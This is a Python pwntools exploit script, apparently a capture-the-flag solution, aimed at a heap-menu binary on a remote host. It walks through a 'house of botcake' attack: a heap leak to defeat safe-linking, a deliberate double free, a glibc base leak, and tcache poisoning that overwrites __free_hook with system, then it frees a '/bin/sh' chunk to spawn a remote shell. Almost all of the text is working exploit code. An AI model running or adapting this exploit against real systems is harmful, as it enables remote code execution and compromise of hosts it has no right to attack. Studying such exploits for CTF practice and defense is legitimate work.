from pwn import *
import re

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''

#context.terminal = ['tmux', 'splitw', '-h']
#binaryname = "./encrypted"
#p = process("./free_a")
p = remote("207.154.239.148", 1371)
#p=gdb.debug(binaryname, gdbscript=gs)
#gdb.attach(p)

def malloc(ind, size):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    #r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3#+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def readLeak(resp):
    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
    paddedleak = rawleak.ljust(8, b'\x00')
    leak = u64(paddedleak)
    return leak


# Now for the actual botcake exploit script
# Getting encryption key
malloc(0, 24)
free(0)
malloc(1, 24)  # Now chunk 0 = chunk 1
resp1 = view(1)
heapLeak = readLeak(resp1)
key = heapLeak

# These will later fill the tcache bins to its max of 7 chunks
for i in range(7):
    malloc(i, 0x108) #intended to fill the 0x110 tcache bin, size is enough to skip fastbins

# These will go to the unsorted bin and consolidate with each other later on
malloc(7, 0x108) 
malloc(8, 0x108)

malloc(9, 0x18) #Barrier/Wall/Jon Snow  to prevent top chunk from stealing our big chunk

# Fill the tcache bins to its max of 7 chunks
for i in range(7):
    free(i) #fill the tcache 0x110
#Now tcache: 6->5->4->3->2->1->0

free(8)  # Now unsorted: 8
free(7) # Instead of going directly into unsorted bin, chunk 7 CONSOLIDATES/merges with chunk 8!
# Now unsorted: addrOf7(which holds 7+8, a big consolidated chunk)

malloc(10, 0x108) #Pops chunk 6 to make room in tcache, so now chunk 6 = chunk 10
# Now tcache: 5->4->3->2->1->0

free(8) # This is the DOUBLE FREE! 8 is now put into tcache
# Now tcache: 8->5->4->3->2->1->0
# BUT 8 is ALSO in the unsorted bin as part of mega chunk (7+8)

malloc(11, 0x138) # Grab the tip of chunk 8

# Now we can view the chunk we just malloced since it used to be chunk 8 but now it’s chunk 11.
resp2 = view(11)
glibcLeak = readLeak(resp2)  # This is our glibc leak!
base = glibcLeak - 1981968  # This is the glibc base!!

# Get freehook and system addresses for current run
elf = ELF("./libc.so.6")
freehookOffset = elf.sym["__free_hook"]
systemOffset = elf.sym["system"]
freehook = base + freehookOffset
system = base + systemOffset

buffersize = 0x138 - 16*3
edit(11, b"A"*buffersize + p64(0x111) + p64(freehook ^ key))  # Change next val of chunk 11 to encrypted freehook addr
# Now tcache: 8->freehook  (we've cut the worm - tcache poisoning!)

malloc(12, 0x108)  # Pop chunk 8
malloc(13, 0x108)  # Pop freehook addr from tcache (so now = chunk 13)
edit(13, p64(system))  # Put system addr in freehook

malloc(14, 24)	# We'll put "/bin/sh" in here so we can pop it (call freehook(system("/bin/sh")) on it)
edit(14, b"/bin/sh")

free(14)     # Call freehook, which now has system("/bin/sh")
p.interactive()

